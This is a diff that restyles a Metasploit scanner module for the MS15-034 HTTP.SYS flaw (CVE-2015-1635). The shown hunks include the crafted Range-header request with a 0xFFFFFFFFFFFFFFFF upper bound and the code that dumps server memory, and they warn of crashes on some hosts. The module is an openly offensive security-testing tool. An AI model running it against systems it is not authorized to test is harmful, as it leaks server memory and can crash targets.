@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,43 +8,41 @@ require 'rex/proto/http'
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure',
-      'Description' => %q{
-        This module dumps memory contents using a crafted Range header and affects only
-        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target
-        is running in VMware Workstation, this module has a high likelihood
-        of resulting in BSOD; however, VMware ESX and non-virtualized hosts
-        seem stable. Using a larger target file should result in more memory
-        being dumped, and SSL seems to produce more data as well.
-      },
-      'Author'      =>
-        [
-          'Rich Whitcroft <rwhitcroft[at]gmail.com>', # Msf module
-          'sinn3r'                                    # Some more Metasploit stuff
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          ['CVE', '2015-1635'],
-          ['MSB', 'MS15-034'],
-          ['URL', 'http://pastebin.com/ypURDPc4'],
-          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
-          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
-          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/'],
-          ['URL', 'http://securitysift.com/an-analysis-of-ms15-034/']
-        ]
-    ))
+                      'Name'        => 'MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure',
+                      'Description' => %q(
+                        This module dumps memory contents using a crafted Range header and affects only
+                        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target
+                        is running in VMware Workstation, this module has a high likelihood
+                        of resulting in BSOD; however, VMware ESX and non-virtualized hosts
+                        seem stable. Using a larger target file should result in more memory
+                        being dumped, and SSL seems to produce more data as well.
+                      ),
+                      'Author'      =>
+                        [
+                          'Rich Whitcroft <rwhitcroft[at]gmail.com>', # Msf module
+                          'sinn3r'                                    # Some more Metasploit stuff
+                        ],
+                      'License'     => MSF_LICENSE,
+                      'References'  =>
+                        [
+                          ['CVE', '2015-1635'],
+                          ['MSB', 'MS15-034'],
+                          ['URL', 'http://pastebin.com/ypURDPc4'],
+                          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
+                          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
+                          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/'],
+                          ['URL', 'http://securitysift.com/an-analysis-of-ms15-034/']
+                        ]))
 
     register_options([
-      OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/']),
-      OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
-    ], self.class)
+                       OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/']),
+                       OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
+                     ], self.class)
 
     deregister_options('VHOST')
   end
@@ -74,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     uris.uniq
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     upper_range = 0xFFFFFFFFFFFFFFFF
 
     potential_static_files_uris.each do |potential_uri|
@@ -109,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['SUPPRESS_REQUEST']
       dump_start = data.index('HTTP/1.1 200 OK')
       if dump_start
-        data[0..dump_start-1] = ''
+        data[0..dump_start - 1] = ''
       else
         print_error("Memory dump start position not found, dumping all data instead")
       end
@@ -126,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_file_size
-    @file_size ||= lambda {
+    @file_size ||= lambda do
       file_size = -1
       uri = normalize_uri(target_uri.path)
       res = send_request_raw('uri' => uri)
@@ -145,7 +144,7 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("File length: #{file_size} bytes")
 
       return file_size
-    }.call
+    end.call
   end
 
   def calc_ranges(content_length)
@@ -163,11 +162,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     begin
-      unless check_host(ip)
+      if check_host(ip)
+        print_good("Target may be vulnerable...")
+      else
         print_error("Target is not vulnerable")
         return
-      else
-        print_good("Target may be vulnerable...")
       end
 
       content_length = get_file_size
@@ -189,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => target_uri.path,
         'method' => 'GET',
         'headers' => {
-        'Range' => ranges
+          'Range' => ranges
         }
       )
       cli.send_request(req)
@@ -212,7 +211,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Timeout receiving from socket")
       return
     ensure
-      cli.close if cli
+      cli&.close
     end
   end
 end
